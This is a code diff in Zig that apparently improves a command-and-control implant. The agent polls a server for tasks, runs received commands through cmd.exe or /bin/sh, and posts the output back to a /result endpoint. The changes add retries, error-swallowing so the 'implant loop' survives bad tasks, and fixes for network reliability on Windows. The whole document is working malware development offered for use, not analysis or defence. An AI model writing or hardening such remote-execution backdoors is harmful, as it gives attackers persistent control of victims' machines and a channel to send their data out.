@@ -106,11 +106,15 @@ fn httpExchangePlain(allocator: mem.Allocator, method: []const u8, path_q: []con
     if (body) |b| try req.appendSlice(allocator, b);
     try stream.writeAll(req.items);
 
-    // Half-close write side so the server can finish the response without RST races on Windows
-    if (builtin.os.tag == .windows) {
-        _ = std.os.windows.ws2_32.shutdown(@ptrCast(stream.handle), 1); // SD_SEND
-    } else {
-        std.posix.shutdown(stream.handle, .send) catch {};
+    // Only half-close on GET. SD_SEND after POST has been observed to RST the
+    // request body / response race on Windows + Python ThreadingHTTPServer,
+    // which drops /result with no server-side output.
+    if (body == null) {
+        if (builtin.os.tag == .windows) {
+            _ = std.os.windows.ws2_32.shutdown(@ptrCast(stream.handle), 1); // SD_SEND
+        } else {
+            std.posix.shutdown(stream.handle, .send) catch {};
+        }
     }
 
     var resp: std.ArrayList(u8) = .empty;
@@ -124,9 +128,14 @@ fn httpExchangePlain(allocator: mem.Allocator, method: []const u8, path_q: []con
         // Stop early once we have headers + Content-Length body
         if (mem.indexOf(u8, resp.items, "\r\n\r\n")) |idx| {
             const headers = resp.items[0..idx];
-            if (mem.indexOf(u8, headers, "Content-Length:")) |cl| {
-                const line_start = cl;
-                const after = headers[line_start + "Content-Length:".len ..];
+            // Case-insensitive Content-Length scan
+            var cl_pos: ?usize = null;
+            if (mem.indexOf(u8, headers, "Content-Length:")) |p| cl_pos = p;
+            if (cl_pos == null) {
+                if (mem.indexOf(u8, headers, "content-length:")) |p| cl_pos = p;
+            }
+            if (cl_pos) |cl| {
+                const after = headers[cl + "Content-Length:".len ..];
                 var i: usize = 0;
                 while (i < after.len and (after[i] == ' ' or after[i] == '\t')) : (i += 1) {}
                 var j = i;
@@ -202,18 +211,18 @@ fn execShell(allocator: mem.Allocator, cmd: []const u8) ![]u8 {
     const trimmed = mem.trim(u8, cmd, " \t\r\n");
     if (trimmed.len == 0) return try allocator.dupe(u8, "");
 
-    var args: std.ArrayList([]const u8) = .empty;
-    defer args.deinit(allocator);
-    if (builtin.os.tag == .windows) {
-        try args.append(allocator, "cmd.exe");
-        try args.append(allocator, "/c");
-    } else {
-        try args.append(allocator, "/bin/sh");
-        try args.append(allocator, "-c");
-    }
-    try args.append(allocator, trimmed);
+    var argv_buf: [3][]const u8 = undefined;
+    const argv: []const []const u8 = blk: {
+        if (builtin.os.tag == .windows) {
+            argv_buf = .{ "cmd.exe", "/c", trimmed };
+            break :blk argv_buf[0..];
+        } else {
+            argv_buf = .{ "/bin/sh", "-c", trimmed };
+            break :blk argv_buf[0..];
+        }
+    };
 
-    var child = process.Child.init(args.items, allocator);
+    var child = process.Child.init(argv, allocator);
     child.stdin_behavior = .Ignore;
     child.stdout_behavior = .Pipe;
     child.stderr_behavior = .Pipe;
@@ -221,13 +230,16 @@ fn execShell(allocator: mem.Allocator, cmd: []const u8) ![]u8 {
     child.spawn() catch |e| return try std.fmt.allocPrint(allocator, "ERROR:{s}\n", .{@errorName(e)});
 
     var out: std.ArrayList(u8) = .empty;
-    defer out.deinit(allocator);
+    errdefer out.deinit(allocator);
     var errb: std.ArrayList(u8) = .empty;
     defer errb.deinit(allocator);
-    child.collectOutput(allocator, &out, &errb, 1024 * 1024) catch |e|
+    // collectOutput already waits/reaps the child — do not call wait() again
+    child.collectOutput(allocator, &out, &errb, 1024 * 1024) catch |e| {
+        _ = child.kill() catch {};
+        _ = child.wait() catch {};
         return try std.fmt.allocPrint(allocator, "ERROR:{s}\n", .{@errorName(e)});
-    _ = child.wait() catch {};
-    if (errb.items.len == 0) return try allocator.dupe(u8, out.items);
+    };
+    if (errb.items.len == 0) return try out.toOwnedSlice(allocator);
     try out.appendSlice(allocator, errb.items);
     return try out.toOwnedSlice(allocator);
 }
@@ -504,13 +516,26 @@ fn postResult(allocator: mem.Allocator, task_id: []const u8, out: []const u8, st
     defer allocator.free(body);
     const path = buildPollPath(allocator, "result") catch return;
     defer allocator.free(path);
-    const resp = httpExchange(allocator, "POST", path, body) catch return;
-    allocator.free(resp);
+    // Retry: Windows POST /result is the fragile hop (poll GET usually works)
+    var attempt: u8 = 0;
+    while (attempt < 3) : (attempt += 1) {
+        if (httpExchange(allocator, "POST", path, body)) |resp| {
+            allocator.free(resp);
+            return;
+        } else |_| {
+            sleepSecs(1);
+        }
+    }
 }
 
 fn handleTaskValue(allocator: mem.Allocator, task: json.Value, next_sleep: u64) !bool {
     const tid = jStr(task, "task_id") orelse "";
-    const result = try runTask(allocator, task);
+    // Never let a task error kill the implant loop — always try to POST something
+    const result = runTask(allocator, task) catch |e| blk: {
+        const msg = try std.fmt.allocPrint(allocator, "ERROR:runTask:{s}\n", .{@errorName(e)});
+        const files = try emptyFiles(allocator);
+        break :blk TaskResult{ .out = msg, .status = "failed", .files_json = files, .die = false };
+    };
     defer allocator.free(result.out);
     defer allocator.free(result.files_json);
     postResult(allocator, tid, result.out, result.status, result.files_json);
@@ -554,7 +579,9 @@ pub fn main() !void {
             if (root.object.get("task")) |t| {
                 if (t == .object) {
                     handled = true;
-                    if (try handleTaskValue(allocator, t, next_sleep)) break;
+                    // catch so a single bad task cannot exit main
+                    const should_die = handleTaskValue(allocator, t, next_sleep) catch false;
+                    if (should_die) break;
                 }
             }
         }
@@ -567,7 +594,8 @@ pub fn main() !void {
                     const tp = json.parseFromSlice(json.Value, allocator, cmd_field, .{}) catch null;
                     if (tp) |p2| {
                         defer p2.deinit();
-                        if (try handleTaskValue(allocator, p2.value, next_sleep)) break;
+                        const should_die = handleTaskValue(allocator, p2.value, next_sleep) catch false;
+                        if (should_die) break;
                         handled = true;
                     }
                 }
@@ -582,6 +610,8 @@ pub fn main() !void {
                     const out = execShell(allocator, shell_cmd) catch try allocator.dupe(u8, "ERROR");
                     defer allocator.free(out);
                     postResult(allocator, "", out, "completed", "[]");
+                    sleepSecs(next_sleep);
+                    handled = true;
                 }
             }
             if (!handled) sleepSecs(next_sleep);
